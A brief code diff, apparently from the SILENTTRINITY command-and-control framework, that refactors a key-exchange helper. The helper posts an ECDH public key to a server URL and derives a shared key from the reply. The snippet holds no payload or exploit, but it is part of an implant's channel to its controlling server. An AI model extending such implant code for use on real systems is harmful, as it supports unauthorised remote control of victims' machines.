@@ -9,19 +9,18 @@ namespace SILENTTRINITY.Utilities
 {
     public static class Crypto
     {
-        // TODO: Migrate to self implemented Diffie-Hellman Key Exchange
         public static byte[] KeyExchange(Uri url)
         {
             byte[] key = default;
 
-            using (ECDiffieHellmanCng AsymAlgo = new ECDiffieHellmanCng())
+            using (dynamic asymAlgo = AsymmetricAlgorithm.Create("ECDiffieHellmanCng"))
             {
-                var publicKey = AsymAlgo.PublicKey.ToXmlString();
+                var publicKey = asymAlgo.PublicKey.ToXmlString();
                 byte[] response = Http.Post(url, Encoding.UTF8.GetBytes(publicKey));
 
                 ECDiffieHellmanCngPublicKey peerPublicKey = 
                     ECDiffieHellmanCngPublicKey.FromXmlString(Encoding.UTF8.GetString(response));
-                key = AsymAlgo.DeriveKeyMaterial(peerPublicKey);
+                key = asymAlgo.DeriveKeyMaterial(peerPublicKey);
             }
 
             return key;
